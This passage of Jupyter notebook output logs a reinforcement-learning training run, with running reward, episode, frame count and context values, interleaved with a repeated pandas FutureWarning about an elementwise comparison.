      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 147600\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147700\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147800\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 147900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 148000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 148100\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148200\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 301\t Frame count: 148400\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148500\t Context: 1\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148600\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148700\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148800\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 148900\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 149000\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 149100\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 149200\t Context: 2\n",
      "Running reward: 11.00\t Episode 301\t Frame count: 149300\t Context: 2\n",
      "Running reward: 11.00\t Episode 302\t Frame count: 149400\t Context: 2\n",
      "Running reward: 11.00\t Episode 303\t Frame count: 149500\t Context: 1\n",
      "Running reward: 11.00\t Episode 303\t Frame count: 149600\t Context: 1\n",
      "Running reward: 11.00\t Episode 303\t Frame count: 149700\t Context: 2\n",
      "Running reward: 11.00\t Episode 304\t Frame count: 149800\t Context: 2\n",
      "Running reward: 11.00\t Episode 304\t Frame count: 149900\t Context: 2\n",
      "Running reward: 11.00\t Episode 304\t Frame count: 150000\t Context: 2\n",
      "Running reward: 11.00\t Episode 304\t Frame count: 150100\t Context: 2\n",
      "Running reward: 11.00\t Episode 305\t Frame count: 150200\t Context: 1\n",
      "Running reward: 11.00\t Episode 305\t Frame count: 150300\t Context: 2\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 150400\t Context: 1\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 150500\t Context: 1\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 150600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 306\t Frame count: 150700\t Context: 1\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 150800\t Context: 1\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 150900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 306\t Frame count: 151000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 306\t Frame count: 151100\t Context: 1\n",
      "Running reward: 11.00\t Episode 306\t Frame count: 151200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 306\t Frame count: 151300\t Context: 2\n",
      "Running reward: 11.00\t Episode 307\t Frame count: 151400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 307\t Frame count: 151500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 307\t Frame count: 151600\t Context: 2\n",
      "Running reward: 11.00\t Episode 307\t Frame count: 151700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 308\t Frame count: 151800\t Context: 1\n",
      "Running reward: 11.00\t Episode 308\t Frame count: 151900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 308\t Frame count: 152000\t Context: 1\n",
      "Running reward: 11.00\t Episode 308\t Frame count: 152100\t Context: 1\n",
      "Running reward: 11.00\t Episode 308\t Frame count: 152200\t Context: 1\n",
      "Running reward: 11.00\t Episode 308\t Frame count: 152300\t Context: 2\n",
      "Running reward: 11.00\t Episode 308\t Frame count: 152400\t Context: 2\n",
      "Running reward: 11.00\t Episode 309\t Frame count: 152500\t Context: 1\n",
      "Running reward: 11.00\t Episode 309\t Frame count: 152600\t Context: 2\n",
      "Running reward: 11.00\t Episode 310\t Frame count: 152700\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 152800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 311\t Frame count: 152900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 311\t Frame count: 153000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 311\t Frame count: 153100\t Context: 1\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153200\t Context: 1\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153300\t Context: 1\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 311\t Frame count: 153500\t Context: 1\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153600\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153700\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153800\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 153900\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 154000\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 154100\t Context: 2\n",
      "Running reward: 11.00\t Episode 311\t Frame count: 154200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 311\t Frame count: 154300\t Context: 2\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 154400\t Context: 1\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 154500\t Context: 1\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 154600\t Context: 2\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 154700\t Context: 2\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 154800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 312\t Frame count: 154900\t Context: 2\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 155000\t Context: 2\n",
      "Running reward: 11.00\t Episode 312\t Frame count: 155100\t Context: 2\n",
      "Running reward: 11.00\t Episode 313\t Frame count: 155200\t Context: 1\n",
      "Running reward: 11.00\t Episode 313\t Frame count: 155300\t Context: 1\n",
      "Running reward: 11.00\t Episode 313\t Frame count: 155400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 313\t Frame count: 155500\t Context: 1\n",
      "Running reward: 11.00\t Episode 313\t Frame count: 155600\t Context: 1\n",
      "Running reward: 11.00\t Episode 314\t Frame count: 155700\t Context: 1\n",
      "Running reward: 11.00\t Episode 314\t Frame count: 155800\t Context: 2\n",
      "Running reward: 11.00\t Episode 314\t Frame count: 155900\t Context: 2\n",
      "Running reward: 11.00\t Episode 315\t Frame count: 156000\t Context: 1\n",
      "Running reward: 11.00\t Episode 315\t Frame count: 156100\t Context: 1\n",
      "Running reward: 11.00\t Episode 315\t Frame count: 156200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 315\t Frame count: 156300\t Context: 2\n",
      "Running reward: 11.00\t Episode 315\t Frame count: 156400\t Context: 2\n",
      "Running reward: 11.00\t Episode 315\t Frame count: 156500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 315\t Frame count: 156600\t Context: 2\n",
      "Running reward: 11.00\t Episode 316\t Frame count: 156700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 316\t Frame count: 156800\t Context: 1\n",
      "Running reward: 11.00\t Episode 317\t Frame count: 156900\t Context: 1\n",
      "Running reward: 11.00\t Episode 317\t Frame count: 157000\t Context: 2\n",
      "Running reward: 11.00\t Episode 318\t Frame count: 157100\t Context: 1\n",
      "Running reward: 11.00\t Episode 318\t Frame count: 157200\t Context: 2\n",
      "Running reward: 11.00\t Episode 318\t Frame count: 157300\t Context: 2\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157400\t Context: 1\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157500\t Context: 1\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157600\t Context: 1\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157700\t Context: 1\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157800\t Context: 2\n",
      "Running reward: 11.00\t Episode 319\t Frame count: 157900\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158000\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158100\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 320\t Frame count: 158300\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158400\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158500\t Context: 2\n",
      "Running reward: 11.00\t Episode 320\t Frame count: 158600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 321\t Frame count: 158700\t Context: 2\n",
      "Running reward: 11.00\t Episode 321\t Frame count: 158800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 321\t Frame count: 158900\t Context: 2\n",
      "Running reward: 11.00\t Episode 321\t Frame count: 159000\t Context: 2\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159100\t Context: 1\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159200\t Context: 1\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 322\t Frame count: 159400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 322\t Frame count: 159500\t Context: 1\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 322\t Frame count: 159700\t Context: 1\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159800\t Context: 2\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 159900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 322\t Frame count: 160000\t Context: 2\n",
      "Running reward: 11.00\t Episode 322\t Frame count: 160100\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160200\t Context: 1\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160300\t Context: 1\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160400\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160500\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160600\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160700\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160800\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 160900\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 161000\t Context: 2\n",
      "Running reward: 11.00\t Episode 323\t Frame count: 161100\t Context: 2\n",
      "Running reward: 11.00\t Episode 324\t Frame count: 161200\t Context: 1\n",
      "Running reward: 11.00\t Episode 324\t Frame count: 161300\t Context: 1\n",
      "Running reward: 11.00\t Episode 324\t Frame count: 161400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 324\t Frame count: 161500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 324\t Frame count: 161600\t Context: 1\n",
      "Running reward: 11.00\t Episode 324\t Frame count: 161700\t Context: 1\n",
      "Running reward: 11.00\t Episode 324\t Frame count: 161800\t Context: 2\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 161900\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162000\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162100\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162200\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162300\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 325\t Frame count: 162500\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162600\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162700\t Context: 1\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 162800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 325\t Frame count: 162900\t Context: 2\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 163000\t Context: 2\n",
      "Running reward: 11.00\t Episode 325\t Frame count: 163100\t Context: 2\n",
      "Running reward: 11.00\t Episode 326\t Frame count: 163200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 327\t Frame count: 163300\t Context: 1\n",
      "Running reward: 11.00\t Episode 327\t Frame count: 163400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 327\t Frame count: 163500\t Context: 1\n",
      "Running reward: 11.00\t Episode 327\t Frame count: 163600\t Context: 1\n",
      "Running reward: 11.00\t Episode 327\t Frame count: 163700\t Context: 1\n",
      "Running reward: 11.00\t Episode 327\t Frame count: 163800\t Context: 2\n",
      "Running reward: 11.00\t Episode 327\t Frame count: 163900\t Context: 2\n",
      "Running reward: 11.00\t Episode 328\t Frame count: 164000\t Context: 1\n",
      "Running reward: 11.00\t Episode 329\t Frame count: 164100\t Context: 1\n",
      "Running reward: 11.00\t Episode 329\t Frame count: 164200\t Context: 1\n",
      "Running reward: 11.00\t Episode 329\t Frame count: 164300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 329\t Frame count: 164400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 329\t Frame count: 164500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 329\t Frame count: 164600\t Context: 1\n",
      "Running reward: 11.00\t Episode 329\t Frame count: 164700\t Context: 1\n",
      "Running reward: 11.00\t Episode 329\t Frame count: 164800\t Context: 1\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 164900\t Context: 1\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165000\t Context: 1\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165100\t Context: 1\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165200\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165300\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165400\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165500\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165600\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165700\t Context: 2\n",
      "Running reward: 11.00\t Episode 330\t Frame count: 165800\t Context: 2\n",
      "Running reward: 11.00\t Episode 331\t Frame count: 165900\t Context: 1\n",
      "Running reward: 11.00\t Episode 331\t Frame count: 166000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
